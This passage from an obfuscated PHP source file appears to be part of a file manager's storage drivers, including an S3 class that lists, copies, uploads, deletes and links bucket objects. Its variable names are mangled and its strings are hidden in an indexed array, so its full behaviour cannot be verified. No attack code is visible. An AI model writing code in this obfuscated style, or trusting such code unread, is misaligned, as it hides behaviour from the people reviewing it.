$²ÓœÍ®[$¨ÇßÒ‡•[32]] . $¨ÇßÒ‡•[200] . $²ÓœÍ®[$¨ÇßÒ‡•[87]]; TaskQueue::add($¨ÇßÒ‡•[201], $ßÄõÚ—É, $öôÚ©õÊ, $ØÑ³Ÿêˆ); } public function makeImageCover($œÔí¹¢ô, $½ı»½Ğ¸, $Œ“õ§Å›, $™¬’è„Ú) { $ÎÊ€é«¶ =& $_SERVER[€ä¾™²]; if (IO::fileNameExist($œÔí¹¢ô, $Œ“õ§Å›)) { return $ÎÊ€é«¶[202]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ñ‚½Øñü = $this->getPathOuter($½ı»½Ğ¸); $ãÆìôş = DATA_THUMB . $Œ“õ§Å›; del_file($ãÆìôş); $“Ü»éş = IO::copy($ñ‚½Øñü, TEMP_FILES, !1, $Œ“õ§Å›); if (!@file_exists($“Ü»éş)) { return $ÎÊ€é«¶[203]; } ImageThumb::createThumb($“Ü»éş, $ãÆìôş, $™¬’è„Ú, $™¬’è„Ú * 10); if (@file_exists($ãÆìôş)) { Cache::remove($Œ“õ§Å›); return IO::move($ãÆìôş, $œÔí¹¢ô); } Cache::set($Œ“õ§Å›, $ÎÊ€é«¶[195], 600); del_file($ãÆìôş); return $ÎÊ€é«¶[204] . $“Ü»éş . $ÎÊ€é«¶[74]; } public function fileOutImageServer($ã†±Üœè, $ÍÔ—Ëøî = 250) { $this->fileOutImage($ã†±Üœè, $ÍÔ—Ëøî); } public function fileNameAuto($ÊÈÇşÎ, $ñ·ÓªÇ±, $ùÆ¯¤éÁ = REPEAT_RENAME, $¨¢œ† = false) { $ûşøÑßñ =& $_SERVER[€ä¾™²]; $ÒşÛÒ³ü = $ÊÈÇşÎ === $ûşøÑßñ[12] ? $ñ·ÓªÇ± : rtrim($ÊÈÇşÎ, $ûşøÑßñ[8]) . $ûşøÑßñ[8] . $ñ·ÓªÇ±; if ($ùÆ¯¤éÁ == REPEAT_REPLACE || !$this->exist($ÒşÛÒ³ü) || $¨¢œ† && $ùÆ¯¤éÁ != REPEAT_RENAME_FOLDER) { return $ñ·ÓªÇ±; } if ($ùÆ¯¤éÁ == REPEAT_SKIP) { return !1; } $èíÃÕì = $ûşøÑßñ[10] . get_path_ext($ñ·ÓªÇ±); $èíÃÕì = $èíÃÕì == $ûşøÑßñ[10] || $¨¢œ† ? $ûşøÑßñ[12] : $èíÃÕì; $¹–¸ìÓ = 1; $´‡ñ©Êî = substr($ñ·ÓªÇ±, 0, strlen($ñ·ÓªÇ±) - strlen($èíÃÕì)); $ç¼ê€ = $´‡ñ©Êî . "\x28{$¹–¸ìÓ}\51{$èíÃÕì}"; while ($this->exist(rtrim($ÊÈÇşÎ, $ûşøÑßñ[8]) . $ûşøÑßñ[8] . $ç¼ê€)) { $ç¼ê€ = $´‡ñ©Êî . "\x28{$¹–¸ìÓ}\51{$èíÃÕì}"; $¹–¸ìÓ++; } return $ç¼ê€; } private function fileNameAutoList($ÁŒé‰ï¾, $ô¤òË¿, $Õ¡ô‹ßÌ = false) { $ãéúãƒ³ =& $_SERVER[€ä¾™²]; $ìÙçÛİ = $this->listPath($ÁŒé‰ï¾, !0); $ìÙçÛİ = array_merge($ìÙçÛİ[$ãéúãƒ³[85]], $ìÙçÛİ[$ãéúãƒ³[86]]); $ú„…ÅÆ‘ = array_to_keyvalue($ìÙçÛİ, $ãéúãƒ³[12], $ãéúãƒ³[32]); $ŞÙ¸‘Ïï = $ãéúãƒ³[10] . get_path_ext($ô¤òË¿); $ŞÙ¸‘Ïï = $ŞÙ¸‘Ïï == $ãéúãƒ³[10] || $Õ¡ô‹ßÌ ? $ãéúãƒ³[12] : $ŞÙ¸‘Ïï; $¤ÃÑèºà = substr($ô¤òË¿, 0, strlen($ô¤òË¿) - strlen($ŞÙ¸‘Ïï)); $¸Á“ƒ‘á = $¤ÃÑèºà . "\x28\x30\51{$ŞÙ¸‘Ïï}"; for ($’Éà’•õ = 1; $’Éà’•õ <= count($ú„…ÅÆ‘) + 1; $’Éà’•õ++) { $¸Á“ƒ‘á = $¤ÃÑèºà . "\x28{$’Éà’•õ}\x29{$ŞÙ¸‘Ïï}"; if (!in_array_not_case($¸Á“ƒ‘á, $ú„…ÅÆ‘)) { return $¸Á“ƒ‘á; } } return $¸Á“ƒ‘á; } public function listAllFiles($ÀäØÉÙ‡, $Íàšıêş) { $˜Ä¥Æ—© =& $_SERVER[€ä¾™²]; if (empty($Íàšıêş)) { return array(); } $Äóó—Çõ = array_keys($Íàšıêş); $ Õ¹İ¾Ÿ = array(); $ÀäØÉÙ‡ = trim($ÀäØÉÙ‡, $˜Ä¥Æ—©[8]); foreach ($Íàšıêş as $·ŸŸºĞÇ => $å¹Á´ŞŒ) { $ÅÃòÖÔˆ = ltrim(substr(trim($·ŸŸºĞÇ, $˜Ä¥Æ—©[8]), strlen($ÀäØÉÙ‡)), $˜Ä¥Æ—©[8]); if (substr($·ŸŸºĞÇ, -1) == $˜Ä¥Æ—©[8]) { $ÅÃòÖÔˆ = rtrim($ÅÃòÖÔˆ, $˜Ä¥Æ—©[8]) . $˜Ä¥Æ—©[8]; } $ Õ¹İ¾Ÿ = array_merge($ Õ¹İ¾Ÿ, $this->slicePath($ÅÃòÖÔˆ)); } $ğ’È‘°¶ = array(); foreach (array_unique($ Õ¹İ¾Ÿ) as $„ù®Ìåï) { $¾¯¥¦… = array($˜Ä¥Æ—©[87] => $this->getPathOuter($˜Ä¥Æ—©[8] . $ÀäØÉÙ‡ . $˜Ä¥Æ—©[8] . $„ù®Ìåï), $˜Ä¥Æ—©[78] => 1, $˜Ä¥Æ—©[79] => 0); if (substr($„ù®Ìåï, -1) != $˜Ä¥Æ—©[8]) { $¾¯¥¦…[$˜Ä¥Æ—©[78]] = 0; $Û‹¡Áí· = $this->getPath($ÀäØÉÙ‡ . $˜Ä¥Æ—©[8] . $„ù®Ìåï); if (isset($Íàšıêş[$Û‹¡Áí·])) { $ÅáÍ«Ûò = $Íàšıêş[$Û‹¡Áí·]; if (isset($ÅáÍ«Ûò[$˜Ä¥Æ—©[79]])) { $¾¯¥¦…[$˜Ä¥Æ—©[79]] = intval($ÅáÍ«Ûò[$˜Ä¥Æ—©[79]]); } if (isset($ÅáÍ«Ûò[$˜Ä¥Æ—©[205]])) { $¾¯¥¦…[$˜Ä¥Æ—©[88]] = intval($ÅáÍ«Ûò[$˜Ä¥Æ—©[205]]); } } } $ğ’È‘°¶[] = $¾¯¥¦…; } return $ğ’È‘°¶; } public function slicePath($‘ÓÉ¶àÎ) { $õ—û¸„ß =& $_SERVER[€ä¾™²]; $œÚœÜ©Å = explode($õ—û¸„ß[8], trim($‘ÓÉ¶àÎ, $õ—û¸„ß[8])); $€‹±Š¾» = 0; do { ++$€‹±Š¾»; $­ÄÎÒŞÔ[] = implode($õ—û¸„ß[8], array_slice($œÚœÜ©Å, 0, $€‹±Š¾»)) . $õ—û¸„ß[8]; } while ($€‹±Š¾» < count($œÚœÜ©Å)); $­ÄÎÒŞÔ[count($œÚœÜ©Å) - 1] = $‘ÓÉ¶àÎ; return $­ÄÎÒŞÔ; } public function getHost() { $÷ÒïÜ§ =& $_SERVER[€ä¾™²]; $¶ïÛÖã = parse_url(trim($this->domain, $÷ÒïÜ§[8])); $°ÀúÙ¢² = isset($¶ïÛÖã[$÷ÒïÜ§[206]]) ? $¶ïÛÖã[$÷ÒïÜ§[206]] : http_type(); $ü·ó¶ğ  = isset($¶ïÛÖã[$÷ÒïÜ§[207]]) ? $¶ïÛÖã[$÷ÒïÜ§[207]] : $¶ïÛÖã[$÷ÒïÜ§[87]]; if (isset($¶ïÛÖã[$÷ÒïÜ§[208]])) { $ü·ó¶ğ  .= $÷ÒïÜ§[4] . $¶ïÛÖã[$÷ÒïÜ§[208]]; } return $°ÀúÙ¢² . $÷ÒïÜ§[209] . $ü·ó¶ğ ; } public function pathEncode($­·ùüıê) { $Ğ„Ò÷ó =& $_SERVER[€ä¾™²]; return str_replace($Ğ„Ò÷ó[210], $Ğ„Ò÷ó[8], rawurlencode($­·ùüıê)); } public function writeLog($ğ“Ï½© = '', $íŞ›‹–Ä = false) { $ƒ¯˜òœ =& $_SERVER[€ä¾™²]; $¶Ì±÷¹˜ = in_array(ACTION, array($ƒ¯˜òœ[211], $ƒ¯˜òœ[212])); if (!$¶Ì±÷¹˜ && !GLOBAL_DEBUG) { return; } $øüäã¾Ô = $ğ“Ï½©; static $±°«ÒŠ® = null; if (!$±°«ÒŠ®) { $±°«ÒŠ® = strtoupper($this->getType()); } $ğ“Ï½© = $±°«ÒŠ® . $ƒ¯˜òœ[213] . $ğ“Ï½©; if ($íŞ›‹–Ä) { $Ş¶¾ºæ = error_get_last(); if ($Ş¶¾ºæ) { $ğ“Ï½© = array($ğ“Ï½©, $Ş¶¾ºæ); } } write_log($ğ“Ï½©, $ƒ¯˜òœ[214]); if ($¶Ì±÷¹˜) { throw new Exception($øüäã¾Ô); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($áôŞà¾Â) { set_timeout(); require_once SDK_DIR . $_SERVER[€ä¾™²][215]; parent::__construct(); $this->_init($áôŞà¾Â); } public function _init($‚ùÀçõ“) { $©Ë‡“…Ì =& $_SERVER[€ä¾™²]; $this->config = $‚ùÀçõ“; foreach ($‚ùÀçõ“ as $ğ—‘øôó => $¹ÅÚüÕ) { if (isset($this->{$ğ—‘øôó})) { $this->{$ğ—‘øôó} = $¹ÅÚüÕ; } } $this->endpoint = $‚ùÀçõ“[$©Ë‡“…Ì[216]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ßÓÙ¿”¸ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($ßÓÙ¿”¸, 0, 7) == $©Ë‡“…Ì[217]) { $ßÓÙ¿”¸ = $©Ë‡“…Ì[218] . substr($ßÓÙ¿”¸, 7); } $this->client->setEndpoint($ßÓÙ¿”¸); if (in_array(ACTION, array($©Ë‡“…Ì[211], $©Ë‡“…Ì[212]))) { $this->client->setExceptions(); } } public function setSignVersion($ãï°ûÌØ = "\166\x34") { $this->signVer = $ãï°ûÌØ; $this->client->setSignVersion($ãï°ûÌØ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ØöñÊ·) { return null; } } public function isBucketCors() { $šïÜ“Í£ =& $_SERVER[€ä¾™²]; $ÍĞñÁá = $this->getBucketCors(); if (!$ÍĞñÁá || !is_array($ÍĞñÁá)) { return !1; } if (!is_array($ÍĞñÁá[$šïÜ“Í£[219]])) { $ÍĞñÁá[$šïÜ“Í£[219]] = explode($šïÜ“Í£[50], $ÍĞñÁá[$šïÜ“Í£[219]]); } if ($ÍĞñÁá[$šïÜ“Í£[220]] != $šïÜ“Í£[221] || !in_array($šïÜ“Í£[221], $ÍĞñÁá[$šïÜ“Í£[219]])) { return !1; } $ÁÃ˜—ÉŸ = array_map($šïÜ“Í£[222], $ÍĞñÁá[$šïÜ“Í£[223]]); if (!is_array($ÁÃ˜—ÉŸ)) { $ÁÃ˜—ÉŸ = array(); } $Ùã°ÚÓ = array($šïÜ“Í£[224], $šïÜ“Í£[225], $šïÜ“Í£[226], $šïÜ“Í£[227], $šïÜ“Í£[228]); $½Ùå¼¿Ş = array_diff($Ùã°ÚÓ, $ÁÃ˜—ÉŸ); return empty($½Ùå¼¿Ş); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($œí®Ñ„) { return $this->client->setRegion($œí®Ñ„); } public function mkfile($ØÑ˜¦éØ, $ú¸åÁÕ¾ = '', $­ÍÎ¤“¢ = REPEAT_RENAME) { $ï‹ö¼ÍŒ = $this->setContent($ØÑ˜¦éØ, $ú¸åÁÕ¾); if ($ï‹ö¼ÍŒ !== !1) { return $this->getPathOuter($ØÑ˜¦éØ); } return !1; } public function mkdir($–‹ŸÜ•, $¤¤±÷´ï = REPEAT_SKIP) { $ÕĞä¶© =& $_SERVER[€ä¾™²]; if (empty($–‹ŸÜ•) && $–‹ŸÜ• !== $ÕĞä¶©[229]) { return !1; } if ($¤¤±÷´ï && $this->_isFolder($–‹ŸÜ•)) { return $this->getPathOuter($–‹ŸÜ•); } $œ—“ñ¼Ì = $this->setContent($–‹ŸÜ•, $ÕĞä¶©[12], !0); if ($œ—“ñ¼Ì !== !1) { return $this->getPathOuter($–‹ŸÜ•); } return !1; } public function copyFile($æ»íêÚ£, $«°ÁùÊ’, $ìëĞº‹ã = array()) { $à»ØûÃø =& $_SERVER[€ä¾™²]; $ëÕéöÛ = $this->objectMeta($æ»íêÚ£); if (!$ëÕéöÛ) { return !1; } if ($ëÕéöÛ[$à»ØûÃø[79]] <= 1024 * 1024 * 200) { $šÉæğÏ = $this->client->copyObject($this->bucket, $æ»íêÚ£, $this->bucket, $«°ÁùÊ’, $à»ØûÃø[230], $ìëĞº‹ã); } else { $šÉæğÏ = $this->client->multiCopyObject($this->bucket, $æ»íêÚ£, $this->bucket, $«°ÁùÊ’, $ìëĞº‹ã); } $šÉæğÏ = $šÉæğÏ ? $this->getPathOuter($«°ÁùÊ’) : !1; return $šÉæğÏ; } public function moveFile($‘Ä„ÏìÈ, $„àÂÂ¼Ò) { if ($this->copyFile($‘Ä„ÏìÈ, $„àÂÂ¼Ò)) { $this->delFile($‘Ä„ÏìÈ); return $this->getPathOuter($„àÂÂ¼Ò); } return !1; } public function delFile($äÀÒÇñ¨) { return $this->client->deleteObject($this->bucket, $äÀÒÇñ¨); } public function delFolder($åÂŞ©¹ ) { $šî™²ë =& $_SERVER[€ä¾™²]; if (!$this->exist($åÂŞ©¹ )) { return !0; } $this->listItemCache = !1; $œä´¥Îî = $this->fileList($åÂŞ©¹ ); $this->listItemCache = !0; $óÒ†ğ€ = trim($åÂŞ©¹ , $šî™²ë[8]) . $šî™²ë[8]; if (!empty($åÂŞ©¹ ) && $åÂŞ©¹  !== $šî™²ë[229] && !in_array($óÒ†ğ€, $œä´¥Îî[$šî™²ë[85]])) { $œä´¥Îî[$šî™²ë[85]][] = $óÒ†ğ€; } $âãÔ¨Ş = $this->delByBatch($œä´¥Îî[$šî™²ë[86]]); if (!$âãÔ¨Ş) { return !1; } $âãÔ¨Ş = $this->delByBatch($œä´¥Îî[$šî™²ë[85]]); if (!$âãÔ¨Ş) { return !1; } return $this->delFile($óÒ†ğ€); } private function delByBatch($…™¾¿ŞŒ) { foreach (array_chunk($…™¾¿ŞŒ, 1000) as $¶î¼Úúğ) { $€ÂÁƒĞë = $this->client->deleteObjects($this->bucket, $¶î¼Úúğ); if (!$€ÂÁƒĞë) { return !1; } } return !0; } public function rename($®õëş, $°©ŞºÒ±) { return $this->renameObject($®õëş, $°©ŞºÒ±); } public function listPath($Í­»…é, $Çğ§ã‹Æ = false) { $èøù™ =& $_SERVER[€ä¾™²]; $£ˆ–÷ò÷ = $this->fileList($Í­»…é, $èøù™[8], !0); foreach ($£ˆ–÷ò÷[$èøù™[85]] as $ÕœÖÌÇŸ => $”–‹Àêü) { $£ˆ–÷ò÷[$èøù™[85]][$ÕœÖÌÇŸ] = $this->folderInfo($”–‹Àêü, $Çğ§ã‹Æ, $”–‹Àêü); } foreach ($£ˆ–÷ò÷[$èøù™[86]] as $ÕœÖÌÇŸ => $”–‹Àêü) { $£ˆ–÷ò÷[$èøù™[86]][$ÕœÖÌÇŸ] = $this->fileInfo($”–‹Àêü[$èøù™[32]], $Çğ§ã‹Æ, $”–‹Àêü); } return $£ˆ–÷ò÷; } protected function infoChildren($‰¡Ú‹İ®, &$Ãô…ª–) { $Ã¥éùô =& $_SERVER[€ä¾™²]; $À¢ò³¥ = $this->fileList($‰¡Ú‹İ®, $Ã¥éùô[12], !0); $Ãô…ª–[$Ã¥éùô[81]] += count($À¢ò³¥[$Ã¥éùô[85]]); $Ãô…ª–[$Ã¥éùô[80]] += count($À¢ò³¥[$Ã¥éùô[86]]); foreach ($À¢ò³¥[$Ã¥éùô[86]] as $‰í˜áÉÇ) { if (!$‰í˜áÉÇ || !$‰í˜áÉÇ[$Ã¥éùô[79]]) { continue; } $Ãô…ª–[$Ã¥éùô[79]] += $‰í˜áÉÇ[$Ã¥éùô[79]]; } } private function fileInfo($êú«ô¶Õ, $ˆÌİ× ¡ = false, $Å÷É…Áæ = array()) { $¤åıŸŒ =& $_SERVER[€ä¾™²]; $”âÜ‡Âï = array($¤åıŸŒ[32] => $this->pathThis($êú«ô¶Õ), $¤åıŸŒ[87] => $this->getPathOuter($êú«ô¶Õ), $¤åıŸŒ[33] => $¤åıŸŒ[231], $¤åıŸŒ[167] => $this->ext($êú«ô¶Õ), $¤åıŸŒ[79] => isset($Å÷É…Áæ[$¤åıŸŒ[79]]) ? $Å÷É…Áæ[$¤åıŸŒ[79]] : 0); if ($ˆÌİ× ¡) { return $”âÜ‡Âï; } $”âÜ‡Âï[$¤åıŸŒ[232]] = $”âÜ‡Âï[$¤åıŸŒ[88]] = 0; $”âÜ‡Âï[$¤åıŸŒ[233]] = $”âÜ‡Âï[$¤åıŸŒ[234]] = !0; if (empty($Å÷É…Áæ)) { $Å÷É…Áæ = $this->objectMeta($êú«ô¶Õ); if (!$Å÷É…Áæ) { return $”âÜ‡Âï; } } if (isset($Å÷É…Áæ[$¤åıŸŒ[235]]) && $Å÷É…Áæ[$¤åıŸŒ[235]]) { $”âÜ‡Âï[$¤åıŸŒ[236]] = $Å÷É…Áæ[$¤åıŸŒ[235]]; } if (isset($Å÷É…Áæ[$¤åıŸŒ[205]])) { $”âÜ‡Âï[$¤åıŸŒ[88]] = $Å÷É…Áæ[$¤åıŸŒ[205]]; } if (isset($Å÷É…Áæ[$¤åıŸŒ[79]])) { $”âÜ‡Âï[$¤åıŸŒ[79]] = $Å÷É…Áæ[$¤åıŸŒ[79]]; } return $”âÜ‡Âï; } private function folderInfo($»ĞÃŠÂš, $Æà‡µ¶Æ = false, $ÈØç–û = array()) { $¾úú½¯Á =& $_SERVER[€ä¾™²]; $úĞÑæë = array($¾úú½¯Á[32] => $this->pathThis($»ĞÃŠÂš), $¾úú½¯Á[87] => $this->getPathOuter($¾úú½¯Á[8] . $»ĞÃŠÂš), $¾úú½¯Á[33] => $¾úú½¯Á[78]); if ($Æà‡µ¶Æ) { return $úĞÑæë; } $úĞÑæë[$¾úú½¯Á[232]] = $úĞÑæë[$¾úú½¯Á[88]] = 0; $úĞÑæë[$¾úú½¯Á[233]] = $úĞÑæë[$¾úú½¯Á[234]] = !0; if ($»ĞÃŠÂš == $¾úú½¯Á[12]) { return $úĞÑæë; } if (empty($ÈØç–û)) { $ÈØç–û = $this->objectMeta(trim($»ĞÃŠÂš, $¾úú½¯Á[8]) . $¾úú½¯Á[8]); } if (isset($ÈØç–û[$¾úú½¯Á[205]])) { $úĞÑæë[$¾úú½¯Á[232]] = $ÈØç–û[$¾úú½¯Á[205]]; } return $úĞÑæë; } private function fileList($”ªŞÅİ£, $©¹¦ºã = '', $èä«£§ñ = 0) { $öÌşÔ¼¤ =& $_SERVER[€ä¾™²]; $ÔãÍ†ô = rtrim($”ªŞÅİ£, $öÌşÔ¼¤[8]) . $öÌşÔ¼¤[8]; $ÔÒºÂÃ´ = $this->listObjs($ÔãÍ†ô, null, null, $©¹¦ºã); if (!$ÔÒºÂÃ´) { return array($öÌşÔ¼¤[85] => array(), $öÌşÔ¼¤[86] => array()); } $÷»ÑõõÊ = $ñ‘ÎŠ³ = array(); foreach ($ÔÒºÂÃ´[$öÌşÔ¼¤[237]] as $éËƒ„¹÷) { $¾ƒ–¶ùï = $éËƒ„¹÷[$öÌşÔ¼¤[32]]; if ($¾ƒ–¶ùï == $ÔãÍ†ô) { continue; } $ğÂğ¼«Ï = isset($éËƒ„¹÷[$öÌşÔ¼¤[79]]) ? $éËƒ„¹÷[$öÌşÔ¼¤[79]] : 0; $§Ê§àÓ = $ğÂğ¼«Ï == 0 && substr($¾ƒ–¶ùï, strlen($¾ƒ–¶ùï) - 1, 1) == $öÌşÔ¼¤[8] ? !0 : !1; $this->cacheMethodInfoSet($¾ƒ–¶ùï, $§Ê§àÓ, $éËƒ„¹÷); if ($§Ê§àÓ) { $÷»ÑõõÊ[] = $¾ƒ–¶ùï; continue; } $ñ‘ÎŠ³[] = $èä«£§ñ ? $éËƒ„¹÷ : $¾ƒ–¶ùï; } foreach ($ÔÒºÂÃ´[$öÌşÔ¼¤[238]] as $éËƒ„¹÷) { $÷»ÑõõÊ[] = $éËƒ„¹÷[$öÌşÔ¼¤[32]]; $this->cacheMethodInfoSet($éËƒ„¹÷[$öÌşÔ¼¤[32]], !0); } $this->cacheMethodInfoSet($”ªŞÅİ£, !0); return array($öÌşÔ¼¤[85] => $÷»ÑõõÊ, $öÌşÔ¼¤[86] => $ñ‘ÎŠ³); } private function listObjs($ÍÈû§ú, $Ç÷ºäÒÇ = null, $š›¡¾š = null, $–ÁôÖ‚Ü = null) { $Ï°×¨ı‚ =& $_SERVER[€ä¾™²]; $ÍÈû§ú = trim($ÍÈû§ú, $Ï°×¨ı‚[8]); $Àåş™ = empty($ÍÈû§ú) && $ÍÈû§ú !== $Ï°×¨ı‚[229] ? $Ï°×¨ı‚[12] : $ÍÈû§ú . $Ï°×¨ı‚[8]; return $this->client->getBucket($this->bucket, $Àåş™, $Ç÷ºäÒÇ, $š›¡¾š, $–ÁôÖ‚Ü, !0); } public function has($˜ÊŞíÀ», $¯” òµ§ = false, $à„ôÊ”ä = true) { $¬½¶é´µ =& $_SERVER[€ä¾™²]; $˜ÊŞíÀ» = trim($˜ÊŞíÀ», $¬½¶é´µ[8]); $Ç« æØÀ = empty($˜ÊŞíÀ») && $˜ÊŞíÀ» !== $¬½¶é´µ[229] ? $¬½¶é´µ[12] : $˜ÊŞíÀ» . $¬½¶é´µ[8]; $ñ¤ƒ“Ñİ = null; $Ü•‰‡†¾ = 500; $™±…„’’ = $¬½¶é´µ[8]; $„ÔŠ³Ì = $±ù»ûœ¯ = array(); while (!0) { $Ç°ëìÖÏ = $this->listObjs($˜ÊŞíÀ», $ñ¤ƒ“Ñİ, $Ü•‰‡†¾, $™±…„’’); if (!$Ç°ëìÖÏ) { break; } $ñ¤ƒ“Ñİ = $Ç°ëìÖÏ[$¬½¶é´µ[239]]; $Šµ¸ÇÖê = $Ç°ëìÖÏ[$¬½¶é´µ[237]]; $¨ù†êòß = $Ç°ëìÖÏ[$¬½¶é´µ[238]]; if (empty($Šµ¸ÇÖê) && empty($¨ù†êòß)) { break; } if (count($Šµ¸ÇÖê) == 1 && $Šµ¸ÇÖê[0][$¬½¶é´µ[32]] == $Ç« æØÀ) { break; } if ($¯” òµ§) { if (count($Šµ¸ÇÖê)) { $Šµ¸ÇÖê = array_column($Šµ¸ÇÖê, $¬½¶é´µ[32]); $„ÔŠ³Ì = array_merge($„ÔŠ³Ì, $Šµ¸ÇÖê); } if (count($¨ù†êòß)) { $¨ù†êòß = array_column($¨ù†êòß, $¬½¶é´µ[32]); $±ù»ûœ¯ = array_merge($±ù»ûœ¯, $¨ù†êòß); } if ($ñ¤ƒ“Ñİ === null) { break; } continue; } if ($à„ôÊ”ä) { if (!empty($Šµ¸ÇÖê)) { if (count($Šµ¸ÇÖê) > 1 || isset($Šµ¸ÇÖê[0][$¬½¶é´µ[32]]) && $Šµ¸ÇÖê[0][$¬½¶é´µ[32]] != $Ç« æØÀ) { return !0; } } } else { if (!empty($¨ù†êòß)) { return !0; } } if ($ñ¤ƒ“Ñİ === null) { break; } } if ($¯” òµ§) { $„ÔŠ³Ì = array_diff($„ÔŠ³Ì, array($Ç« æØÀ)); $„ÔŠ³Ì = count(array_unique($„ÔŠ³Ì)); $±ù»ûœ¯ = count(array_unique($±ù»ûœ¯)); return array($¬½¶é´µ[240] => $„ÔŠ³Ì, $¬½¶é´µ[241] => $±ù»ûœ¯); } return !1; } public function listAll($âö»­ıÊ) { $Ô¸ãèª÷ =& $_SERVER[€ä¾™²]; $«äÒ«ß¬ = $this->fileList($âö»­ıÊ, $Ô¸ãèª÷[12], !0); $Å£Œ¹é = array_to_keyvalue($«äÒ«ß¬[$Ô¸ãèª÷[86]], $Ô¸ãèª÷[32]); foreach ($«äÒ«ß¬[$Ô¸ãèª÷[85]] as $À†¡æ•ñ) { if (is_string($À†¡æ•ñ)) { $Å£Œ¹é[$À†¡æ•ñ] = array($Ô¸ãèª÷[79] => 0); } } return $this->listAllFiles($âö»­ıÊ, $Å£Œ¹é); } public function canRead($ƒ¸ß÷Ğí) { $íî…¾Œ =& $_SERVER[€ä¾™²]; $ïóÅóÓ“ = $this->client->getAccessControlPolicy($this->bucket, $ƒ¸ß÷Ğí); if (!$ïóÅóÓ“) { return !1; } return in_array($ïóÅóÓ“, array($íî…¾Œ[242], $íî…¾Œ[243], $íî…¾Œ[244])) ? !0 : !1; } public function canWrite($ú×²³°µ) { $é‚ù­Ğù =& $_SERVER[€ä¾™²]; $™ÃÙºĞÍ = $this->client->getAccessControlPolicy($this->bucket, $ú×²³°µ); if (!$™ÃÙºĞÍ) { return !1; } return in_array($™ÃÙºĞÍ, array($é‚ù­Ğù[242], $é‚ù­Ğù[243])) ? !0 : !1; } public function getContent($×ÊÓËÏù) { return $this->client->getObject($this->bucket, $×ÊÓËÏù); } public function setContent($ø ½ı†, $µêèé¤Õ = '', $¦õéç¸¢ = false) { $Á‡£§Æş =& $_SERVER[€ä¾™²]; $ø ½ı† = $¦õéç¸¢ ? trim($ø ½ı†, $Á‡£§Æş[8]) . $Á‡£§Æş[8] : $ø ½ı†; $Ø••€‡½ = get_file_mime(get_path_ext($ø ½ı†)); $¯—§Ôì = $this->client->putObject($µêèé¤Õ, $this->bucket, $ø ½ı†, $Á‡£§Æş[230], array(), $Ø••€‡½); if (!$¯—§Ôì) { return !1; } if ($¦õéç¸¢) { return !0; } return $¯—§Ôì ? !0 : !1; } public function fileSubstr($àİ¬¹Êş, $ ÔË‹£È, $¶•êˆ‘) { $ò‘¿†Õ› = $ ÔË‹£È + $¶•êˆ‘ - 1; return $this->client->getObject($this->bucket, $àİ¬¹Êş, array($_SERVER[€ä¾™²][245] => "\142\x79\x74\145\163\75{$ ÔË‹£È}\x2d{$ò‘¿†Õ›}")); } public function upload($‡§ûß¶“, $¡£ ÎÅ, $¥¡¶Ê‘ä = false, $Áøî¥‡² = REPEAT_REPLACE) { $õºŒÅÓ¹ =& $_SERVER[€ä¾™²]; if (!$¡£ ÎÅ || !@file_exists($¡£ ÎÅ)) { return !1; } $âäÇñû¡ = array($õºŒÅÓ¹[246] => @md5_file($¡£ ÎÅ)); $ºİŞæÎ£ = array($õºŒÅÓ¹[247] => get_file_mime(get_path_ext($‡§ûß¶“))); if (IO::size($¡£ ÎÅ) <= 1024 * 1024 * 200) { $‡•–îåÁ = $this->client->putObjectFile($¡£ ÎÅ, $this->bucket, $‡§ûß¶“, $õºŒÅÓ¹[230], $âäÇñû¡, $ºİŞæÎ£); return !empty($‡•–îåÁ) ? $this->getPathOuter($‡§ûß¶“) : !1; } $Ğãşß±ì = $this->client->multiUploadObject($¡£ ÎÅ, $this->bucket, trim($‡§ûß¶“, $õºŒÅÓ¹[8]), $âäÇñû¡, $ºİŞæÎ£); return $Ğãşß±ì ? $this->getPathOuter($‡§ûß¶“) : !1; } public function download($â¬‚Ôñ, $‡Ğ¢÷ı”) { if (!@is_dir($this->pathFather($‡Ğ¢÷ı”)) && !IO::mkdir($this->pathFather($‡Ğ¢÷ı”))) { return !1; } $’é¦ÎÖ = $this->client->getObject($this->bucket, $â¬‚Ôñ, array(), $‡Ğ¢÷ı”); return $’é¦ÎÖ !== !1 ? $‡Ğ¢÷ı” : !1; } public function link($ÄŞ–³ ó, $ÃäÄËÎµ = array()) { return $this->getPreSignedURL($ÄŞ–³ ó, 3600 * 12, $ÃäÄËÎµ); } private function getPreSignedURL($¢½´¬÷ı, $„±åûó£, $ºİı¸»Ş = array(), $©¬È‹÷¸ = "\107\x45\124") { $Ş±ãÃĞÛ =& $_SERVER[€ä¾™²]; $¢½´¬÷ı = trim($¢½´¬÷ı, $Ş±ãÃĞÛ[8]); if ($this->signVer == $Ş±ãÃĞÛ[248]) { return $this->client->getPreSignedV2URL($this->bucket, $¢½´¬÷ı, $„±åûó£, $©¬È‹÷¸, $ºİı¸»Ş); } return $this->client->getPreSignedV4URL($this->bucket, $¢½´¬÷ı, $„±åûó£, array(), $©¬È‹÷¸, $ºİı¸»Ş); } public function fileOut($¢à¡˜†Ø, $¦™ÕÂøĞ = false, $’ºÓ‡÷ = false, $Éöùı²ì = '') { $Ú”µ—Èâ =& $_SERVER[€ä¾™²]; if ($this->isFileOutServer()) { return $this->fileOutServer($¢à¡˜†Ø, $¦™ÕÂøĞ, $’ºÓ‡÷, $Éöùı²ì); } if (!$’ºÓ‡÷) { $’ºÓ‡÷ = $this->pathThis($¢à¡˜†Ø); } $Ï±ıÊÈÚ = get_file_mime(get_path_ext($’ºÓ‡÷)); if ($Ï±ıÊÈÚ == $Ú”µ—Èâ[249]) { return parent::fileOut($¢à¡˜†Ø, $¦™ÕÂøĞ, $’ºÓ‡÷, $Éöùı²ì); } $ì“çèø = array($Ú”µ—Èâ[250] => $Ï±ıÊÈÚ); if ($¦™ÕÂøĞ) { $ì“çèø[$Ú”µ—Èâ[251]] = $Ú”µ—Èâ[252] . 